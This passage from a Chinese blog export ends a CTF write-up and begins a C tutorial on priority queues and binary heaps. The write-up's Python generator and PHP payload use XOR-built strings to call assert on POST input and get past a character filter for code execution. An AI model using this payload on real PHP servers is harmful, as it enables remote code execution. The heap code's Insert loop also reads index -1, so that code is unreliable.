class="string">&#x27;&#x27;&#x27;(&quot;&#x27;&quot;^&quot;^&quot;).&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;z&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;&amp;&quot;^&quot;\\&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;A&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;!&quot;^&quot;`&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;B&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;&lt;&quot;^&quot;~&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;C&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;#&quot;^&quot;`&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;D&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;$&quot;^&quot;`&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;E&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;%&quot;^&quot;`&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;F&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;&amp;&quot;^&quot;`&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;G&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;:&quot;^&quot;&#125;&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;H&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;(&quot;^&quot;`&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;I&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;)&quot;^&quot;`&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;J&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;*&quot;^&quot;`&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;K&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;+&quot;^&quot;`&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;L&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;,&quot;^&quot;`&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;M&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;-&quot;^&quot;`&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;N&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;.&quot;^&quot;`&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;O&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;/&quot;^&quot;`&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;P&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;.&quot;^&quot;~&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;Q&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;-&quot;^&quot;|&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;R&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;.&quot;^&quot;|&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;S&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;(&quot;^&quot;&#123;&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;T&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;(&quot;^&quot;|&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;U&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;(&quot;^&quot;&#125;&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;V&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;(&quot;^&quot;~&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;W&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;)&quot;^&quot;~&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;X&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;#&quot;^&quot;&#123;&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;Y&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;$&quot;^&quot;&#123;&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;Z&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;$&quot;^&quot;~&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload += i</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;payload:\n&quot;</span>+payload)</span><br><span class="line"><span class="comment">#--------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Parse_to_URL</span>(<span class="params">s</span>):</span><br><span class="line">    a=<span class="string">&quot;%&quot;</span>+<span class="built_in">hex</span>(<span class="built_in">ord</span>(s))</span><br><span class="line">    a=a.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;URL encode Payload:\n&quot;</span>)</span><br><span class="line">payload=<span class="built_in">list</span>(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="built_in">len</span>(payload),<span class="number">10</span>):</span><br><span class="line">    payload[i]=Parse_to_URL(payload[i])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>,<span class="built_in">len</span>(payload),<span class="number">10</span>):</span><br><span class="line">    payload[i]=Parse_to_URL(payload[i])</span><br><span class="line">payload=<span class="string">&quot;&quot;</span>.join(payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>构造payload如下。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mess=<span class="variable">$_</span>=(<span class="string">&quot;!&quot;</span>^<span class="string">&quot;@&quot;</span>).(<span class="string">&quot;-&quot;</span>^<span class="string">&quot;^&quot;</span>).(<span class="string">&quot;-&quot;</span>^<span class="string">&quot;^&quot;</span>).(<span class="string">&quot;%&quot;</span>^<span class="string">&quot;@&quot;</span>).(<span class="string">&quot;/&quot;</span> ^ <span class="string">&quot;]&quot;</span>).(<span class="string">&quot;/&quot;</span>^<span class="string">&quot;[&quot;</span>);<span class="variable">$__</span> = (<span class="string">&#x27;&#123;&#x27;</span> ^ <span class="string">&#x27;$&#x27;</span>) . (<span class="string">&quot;.&quot;</span> ^ <span class="string">&quot;~&quot;</span>) . (<span class="string">&quot;/&quot;</span> ^ <span class="string">&quot;`&quot;</span>) . (<span class="string">&quot;(&quot;</span> ^ <span class="string">&quot;&#123;&quot;</span>) . (<span class="string">&quot;(&quot;</span> ^ <span class="string">&quot;|&quot;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);&amp;_=<span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="comment">//$_===assert</span></span><br><span class="line"><span class="comment">//$__===_POST</span></span><br><span class="line"><span class="comment">//$___===$_POST</span></span><br><span class="line"><span class="comment">//$_($___[_])===assert($_POST[&#x27;_&#x27;])</span></span><br></pre></td></tr></table></figure><p>执行代码，回显<code>phpinfo()</code>页面，查找得flag<code>NSSCTF&#123;5d6e9815-af9a-442f-8165-2a99598ddc36&#125;</code>。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240226171106149.png" alt="image-20240226171106149" /></p><h3 id="参考-7"><a class="markdownIt-Anchor" href="#参考-7"></a> 参考</h3><ul><li><a href="https://www.nssctf.cn/note/set/829">文章 - 【HUBUCTF 2022 新生赛】HowToGetShell tangkaiixng的WriteUp | NSSCTF</a></li></ul><hr /><p>（分割线~）</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/c74d52864acadc32631ab8b75a6cb15.jpg" alt="c74d52864acadc32631ab8b75a6cb15" /></p>]]></content>
      
      
      <categories>
          
          <category> CTF Write Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构什锦（五点五）——优先队列和堆</title>
      <link href="/posts/6caada619458/"/>
      <url>/posts/6caada619458/</url>
      
        <content type="html"><![CDATA[<p>在学习图论时遇到一点阻碍，涉及到路径规划算法部分涉及到了优先队列的知识点。所以，作为前置知识，我们先来学习一下优先队列。</p><hr /><h2 id="什么是优先队列"><a class="markdownIt-Anchor" href="#什么是优先队列"></a> 什么是优先队列</h2><p>优先队列与队列的听起来很像，区别在于：优先队列是根据元素的优先级而不是先进先出的顺序来处理数据。比如一个作业调度系统，决定作业调度顺序的是作业优先级而不是先进先出原则。故我们要从一堆元素中找出元素的最大值/最小值，就可以使用优先队列ADT进行操作。优先队列是一种支持插入、删除最小值（删除并返回最小值）、删除最大值（删除并返回最大值）操作的数据结构。</p><p>如果具有最小关键字的元素具有最高优先级（总是删除最小元素），那么这种优先队列被称为<em>上升优先（ascending-priority）队列</em>。类似的，如果具有最大关键字的元素具有最高优先级（总是删除最大元素），那么这种队列就是<em>下降优先级（descending-priority）队列</em>。因为这两种队列是对称的，所以我们仅讨论上升优先队列。</p><h2 id="抽象数据类型"><a class="markdownIt-Anchor" href="#抽象数据类型"></a> 抽象数据类型</h2><p>我们先给出该ADT的操作部分。</p><h3 id="主要操作"><a class="markdownIt-Anchor" href="#主要操作"></a> 主要操作</h3><p>优先队列是一种数据元素的容器，每个元素具有一个关联的关键字。</p><ul><li>Insert（key,data）:插入一个关键字为key的数据元素到优先队列中，数据元素基于关键字有序。</li><li>DeleteMin/DeleteMax：删除并返回具有最小值/最大值关键字的元素。</li><li>GetMinimum/GetMaximum：返回具有最小/最大关键字的元素。</li></ul><h3 id="辅助操作"><a class="markdownIt-Anchor" href="#辅助操作"></a> 辅助操作</h3><ul><li>第k小/第k大：返回优先队列中第k小/第k大的元素</li><li>大小：返回优先队列中的数据元素个数</li><li>堆排序：基于优先级（关键字）对优先队列中的数据进行排序</li></ul><h2 id="应用"><a class="markdownIt-Anchor" href="#应用"></a> 应用</h2><p>优先队列有很多应用。</p><ul><li>数据压缩：Huffmanm编码算法</li><li>最短路径算法：Dijkstra算法</li><li>最小生成树算法：Prim算法</li><li>事件驱动仿真：客户排队</li><li>选择问题：查找第k小的元素</li></ul><h2 id="实现"><a class="markdownIt-Anchor" href="#实现"></a> 实现</h2><p>下面我们来探讨优先队列的具体实现，接下来我们来给出优先队列的几种可能的实现方式。</p><h3 id="基于无序数组的实现"><a class="markdownIt-Anchor" href="#基于无序数组的实现"></a> 基于无序数组的实现</h3><p>元素插入数组时不考虑排序，每次删除操作时先搜索最小关键字再进行操作。</p><h3 id="基于无序链表的实现"><a class="markdownIt-Anchor" href="#基于无序链表的实现"></a> 基于无序链表的实现</h3><p>这种实现方式和基于无序数组的实现方式非常相似，只不过使用的是链表而非数组罢了。</p><h3 id="基于有序数组的实现"><a class="markdownIt-Anchor" href="#基于有序数组的实现"></a> 基于有序数组的实现</h3><p>基于数组元素的关键字进行排序，我们将数据插入到数组适当的位置上，这样在删除元素时只需要在数组的一端进行操作。</p><h3 id="基于有序链表的实现"><a class="markdownIt-Anchor" href="#基于有序链表的实现"></a> 基于有序链表的实现</h3><p>基于数据元素关键字的排序顺序，将数据元素插入在链表的适当位置上，删除元素只需要在链表的一端进行，这样既保留了优先队列的状态，又可以继续使用其他的链表ADT相关函数。</p><h3 id="基于二叉树的实现"><a class="markdownIt-Anchor" href="#基于二叉树的实现"></a> 基于二叉树的实现</h3><p>如果插入的元素是随机给定的，那么插入和删除操作的平均时间复杂度将降至O(log<sub>n</sub>)。</p><h3 id="基于平衡搜索二叉树的实现"><a class="markdownIt-Anchor" href="#基于平衡搜索二叉树的实现"></a> 基于平衡搜索二叉树的实现</h3><p>插入和删除操作的最坏时间复杂度为O(log<sub>n</sub>)。</p><h3 id="基于二项堆的实现"><a class="markdownIt-Anchor" href="#基于二项堆的实现"></a> 基于二项堆的实现</h3><p>接下来我们将详细讨论这种实现方式。它的搜索、插入和删除操作时间复杂度均为O(log<sub>n</sub>)，查找最大或最小元素的操作为O(1)。</p><h2 id="堆和二项堆"><a class="markdownIt-Anchor" href="#堆和二项堆"></a> 堆和二项堆</h2><p><strong>堆是具有某种特定性质的树</strong>。堆的基本要求是：其节点的值必须大于等于（或者小于等于）它孩子节点的值。这被称为<em>堆的性质</em>。堆还拥有其他性质：比如某h&gt;0的堆，其叶子节点全部分布在第h层或者h－1层(参考完全二叉树)。这意味着，堆应该看起来像是一棵完全二叉树。</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB;1((1))--&gt;2((2))1((1))--&gt;3((3))2((2))--&gt;4((4))2((2))--&gt;5((5))  </pre></div><p>根据堆的性质，我们可以把堆分为两类。</p><ul><li>小顶堆（min heap）：节点的值必须小于等于它孩子节点的值。（两个都得小与，故我这本书p207这里的图是错误的）</li><li>大顶堆（max heap）：节点的值必须大于等于它孩子节点的值。</li></ul><h2 id="二项堆"><a class="markdownIt-Anchor" href="#二项堆"></a> 二项堆</h2><p>在二项堆中，每个节点最多只能有两个孩子。在实际应用中，二项堆已经够用了，所以接下来我们将着重讨论二项小顶堆（binary min heap）和二项大顶堆（binary max heap）。</p><p>根据我们前面介绍的实现方法，我们既可以用数组来线性存储，也可以用指针来链式存储。这里我们主要学习一下利用数组来实现的堆。</p><p>注意：以下的讨论我们都是假设在大顶堆上进行操作的。</p><h3 id="声明"><a class="markdownIt-Anchor" href="#声明"></a> 声明</h3><p>堆的声明代码如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Heap</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> *<span class="built_in">array</span>;</span><br><span class="line">    <span class="type">int</span> count;<span class="comment">//堆中数据元素的个数，即堆的大小</span></span><br><span class="line">    <span class="type">int</span> capacity;<span class="comment">//堆的容量</span></span><br><span class="line">    <span class="type">int</span> heap_type;<span class="comment">//小顶堆或大顶堆</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="创建堆"><a class="markdownIt-Anchor" href="#创建堆"></a> 创建堆</h3><p>创建堆的代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> Heap*<span class="title function_">CreatHeap</span><span class="params">(<span class="type">int</span> capacity,<span class="type">int</span> heap_type)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Heap</span>*<span class="title">h</span>=</span>(<span class="keyword">struct</span> Heap*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> Heap));</span><br><span class="line">    <span class="keyword">if</span>(h==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Memory Error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    h-&gt;heap_type=heap_type;</span><br><span class="line">    h-&gt;count=<span class="number">0</span>;</span><br><span class="line">    h-&gt;capacity=capacity;</span><br><span class="line">    h-&gt;<span class="built_in">array</span>=(<span class="type">int</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span> (<span class="type">int</span>)*capacity);</span><br><span class="line">    <span class="keyword">if</span>(h-&gt;<span class="built_in">array</span>==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Memory Error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="节点的双亲"><a class="markdownIt-Anchor" href="#节点的双亲"></a> 节点的双亲</h3><p>位于第i个位置的元素它的双亲节点位于第i-1/2的位置上。比如第二个位置的元素的双亲结点在第0个位置上。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">parent</span><span class="params">(<span class="keyword">struct</span> Heap*h,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;=<span class="number">0</span>||i&gt;=h-&gt;count)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> (i<span class="number">-1</span>)/<span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="节点的孩子"><a class="markdownIt-Anchor" href="#节点的孩子"></a> 节点的孩子</h3><p>类似于上面对双亲的讨论，第i个位置的节点的孩子分别在2*i+1和2*i+2的位置上。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">LeftChild</span><span class="params">(<span class="keyword">struct</span> Heap*h,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    <span class="type">int</span> left=<span class="number">2</span>*i+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (left&gt;=h-&gt;count)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">RightChild</span><span class="params">(<span class="keyword">struct</span> Heap*h,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    <span class="type">int</span> right=<span class="number">2</span>*i+<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (right&gt;=h-&gt;count)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> right;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="获取最大值元素"><a class="markdownIt-Anchor" href="#获取最大值元素"></a> 获取最大值元素</h3><p>因为在大顶堆中最大值元素总是位于根，所以它被存入h-&gt;array[0]。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">GetMaximum</span><span class="params">(<span class="keyword">struct</span> Heap*h)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(h-&gt;count==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> h-&gt;<span class="built_in">array</span>[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调整堆元素"><a class="markdownIt-Anchor" href="#调整堆元素"></a> 调整堆元素</h3><p>插入元素到堆后，可能无法满足堆的性质。这时我们就要调整堆中元素的位置使其重新成为堆，这个过程称为<em>堆调整</em>。</p><p>在大顶堆中，如果我们要进行堆调整，那么我们就找到不符合堆性质的节点，交换其与其孩子节点的最大值，然后重复这个步骤直到每个节点都满足堆的性质为止。</p><p>比如现在我们有一颗树，它的元素1并不满足堆的性质。</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB;1((31))--&gt;2((1))1((31))--&gt;3((21))2((1))--&gt;4((5))2((1))--&gt;5((10))3((21))--&gt;6((12))3((21))--&gt;7((18))4((5))--&gt;8((3))4((5))--&gt;9((2))5((10))--&gt;10((8))5((10))--&gt;11((7))  </pre></div><p>为了调整元素1，我们找到它的最大孩子10.然后对其交换位置。</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB;1((31))--&gt;5((10))1((31))--&gt;3((21))5((10))--&gt;4((5))5((10))--&gt;2((1))3((21))--&gt;6((12))3((21))--&gt;7((18))4((5))--&gt;8((3))4((5))--&gt;9((2))2((1))--&gt;10((8))2((1))--&gt;11((7))  </pre></div><p>还是不符合堆的性质，现在继续互选元素1和元素8。</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB;1((31))--&gt;5((10))1((31))--&gt;3((21))5((10))--&gt;4((5))5((10))--&gt;10((8))3((21))--&gt;6((12))3((21))--&gt;7((18))4((5))--&gt;8((3))4((5))--&gt;9((2))10((8))--&gt;2((1))10((8))--&gt;11((7))  </pre></div><p>现在这棵树满足堆的性质了。由于我们是自顶向下的方向来进行堆调整，所以我们称这种方法为<strong>向下渗透（percolate down）</strong>。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PercolateDown</span><span class="params">(<span class="keyword">struct</span> Heap*h,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    <span class="type">int</span> l,r,max,temp;</span><br><span class="line">    l= LeftChild(h,i);</span><br><span class="line">    r= RightChild(h,i);</span><br><span class="line">    <span class="keyword">if</span>(l!=<span class="number">-1</span>&amp;&amp;h-&gt;<span class="built_in">array</span>[l]&gt;h-&gt;<span class="built_in">array</span>[i])</span><br><span class="line">        max=l;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        max=i;</span><br><span class="line">    <span class="keyword">if</span>(r!=<span class="number">-1</span>&amp;&amp;h-&gt;<span class="built_in">array</span>[r]&gt;h-&gt;<span class="built_in">array</span>[max])</span><br><span class="line">        max=r;</span><br><span class="line">    <span class="keyword">if</span>(max!=i)&#123;</span><br><span class="line">        <span class="comment">//互换h-&gt;array[i]和array[max]</span></span><br><span class="line">        temp=h-&gt;<span class="built_in">array</span>[i];</span><br><span class="line">        h-&gt;<span class="built_in">array</span>[i]=h-&gt;<span class="built_in">array</span>[max];</span><br><span class="line">        h-&gt;<span class="built_in">array</span>[max]=temp;</span><br><span class="line">        <span class="comment">//重复递归直到顺序正常，最坏的情况就是到达某个叶子节点</span></span><br><span class="line">        PercolateDown(h, max);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="删除元素"><a class="markdownIt-Anchor" href="#删除元素"></a> 删除元素</h3><p>堆只支持删除根节点元素的操作，也就是删除最大元素。在删除最大元素后，我们将最后一个节点移动到根节点，然后对根节点重新调用向下渗透来调整堆元素。简而言之分为三步：</p><ul><li>复制根节点元素到某个变量并准备返回</li><li>复制最后一个节点的元素到第一个元素的位置/根节点</li><li>对第一个节点/根节点调用向下渗透</li></ul><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">DeleteMax</span><span class="params">(<span class="keyword">struct</span> Heap*h)</span>&#123;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="keyword">if</span>(h-&gt;count==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    data=h-&gt;<span class="built_in">array</span>[<span class="number">0</span>];</span><br><span class="line">    h-&gt;<span class="built_in">array</span>[<span class="number">0</span>]=h-&gt;<span class="built_in">array</span>[h-&gt;count<span class="number">-1</span>];</span><br><span class="line">    h-&gt;count--;<span class="comment">//堆大小减一</span></span><br><span class="line">    PercolateDown(h,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="插入元素"><a class="markdownIt-Anchor" href="#插入元素"></a> 插入元素</h3><p>插入元素与删除元素的步骤类似，都可以简单的分为三步。</p><ul><li>堆大小加一</li><li>将元素存放在堆/树的末端</li><li>自底向上对该元素进行堆调整</li></ul><p>同样的，我们可以用图例来说明自底向上法是怎么进行的。假设我们向堆的末端插入了一个元素24。</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB;1((31))--&gt;5((10))1((31))--&gt;3((21))5((10))--&gt;4((5))5((10))--&gt;10((8))3((21))--&gt;6((12))3((21))--&gt;7((18))4((5))--&gt;8((3))4((5))--&gt;9((2))10((8))--&gt;2((1))10((8))--&gt;11((7))6((12))--&gt;12((24))  </pre></div><p>调整堆，将24与其双亲结点进行比较，调换24与其双亲结点12。</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB;1((31))--&gt;5((10))1((31))--&gt;3((21))5((10))--&gt;4((5))5((10))--&gt;10((8))3((21))--&gt;12((24))3((21))--&gt;7((18))4((5))--&gt;8((3))4((5))--&gt;9((2))10((8))--&gt;2((1))10((8))--&gt;11((7))12((24))--&gt;6((12))  </pre></div><p>重复以上步骤，继续调换24与21。</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB;1((31))--&gt;5((10))1((31))--&gt;12((24))5((10))--&gt;4((5))5((10))--&gt;10((8))12((24))--&gt;3((21))12((24))--&gt;7((18))4((5))--&gt;8((3))4((5))--&gt;9((2))10((8))--&gt;2((1))10((8))--&gt;11((7))3((21))--&gt;6((12))  </pre></div><p>此时该堆满足堆的性质，调整完毕。因为我们是自底向上进行调整，所以我们称这种方法为<strong>向上渗透（percolate up）</strong>。</p><p>那么，插入的代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ResizeHeap</span><span class="params">(<span class="keyword">struct</span> Heap*h)</span>&#123;<span class="comment">//把堆大小扩大至原先的两倍</span></span><br><span class="line">    <span class="type">int</span> *array_old=h-&gt;<span class="built_in">array</span>;</span><br><span class="line">    h-&gt;<span class="built_in">array</span>=(<span class="type">int</span>*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span> (<span class="type">int</span>)*h-&gt;capacity*<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(h-&gt;<span class="built_in">array</span>==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Memory Error.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; h-&gt;capacity; ++i) &#123;</span><br><span class="line">        h-&gt;<span class="built_in">array</span>[i]=array_old[i];</span><br><span class="line">    &#125;</span><br><span class="line">    h-&gt;capacity*=<span class="number">2</span>;</span><br><span class="line">    <span class="built_in">free</span>(array_old);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Insert</span><span class="params">(<span class="keyword">struct</span> Heap*h,<span class="type">int</span> data)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(h-&gt;count==h-&gt;capacity)</span><br><span class="line">        ResizeHeap(h);</span><br><span class="line">    h-&gt;count++;</span><br><span class="line">    i=h-&gt;count<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i&gt;=<span class="number">0</span>&amp;&amp;data&gt;h-&gt;<span class="built_in">array</span>[parent(h,i)])&#123;</span><br><span class="line">        <span class="comment">//如果i大于零且要插入的数据比最后一个节点的双亲节点值要大</span></span><br><span class="line">        <span class="comment">//就把双亲结点移动到最后一个节点的位置</span></span><br><span class="line">        <span class="comment">//注意，此时最后一个节点没有插入数据，也就是说移动后的双亲结点位置的值是未定义的</span></span><br><span class="line">        h-&gt;<span class="built_in">array</span>[i]=h-&gt;<span class="built_in">array</span>[parent(h,i)];</span><br><span class="line">        i= parent(h,i);</span><br><span class="line">    &#125;</span><br><span class="line">    h-&gt;<span class="built_in">array</span>[i]=data;<span class="comment">//最后才讲data的值插入到正确的位置</span></span><br><span class="line">    <span class="comment">//然而我觉得开始时就先插入data的值，最后只要交换成功就完成会不会更好</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="撤销堆"><a class="markdownIt-Anchor" href="#撤销堆"></a> 撤销堆</h3><p>堆的主要几个操作都介绍完毕了，最后我们要做的就是在程序关闭前释放堆的内存空间。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DestroyHeap</span><span class="params">(<span class="keyword">struct</span> Heap*h)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(h==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">free</span>(h-&gt;<span class="built_in">array</span>);</span><br><span class="line">    <span class="built_in">free</span>(h);</span><br><span class="line">    h=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="将数组调整成堆"><a class="markdownIt-Anchor" href="#将数组调整成堆"></a> 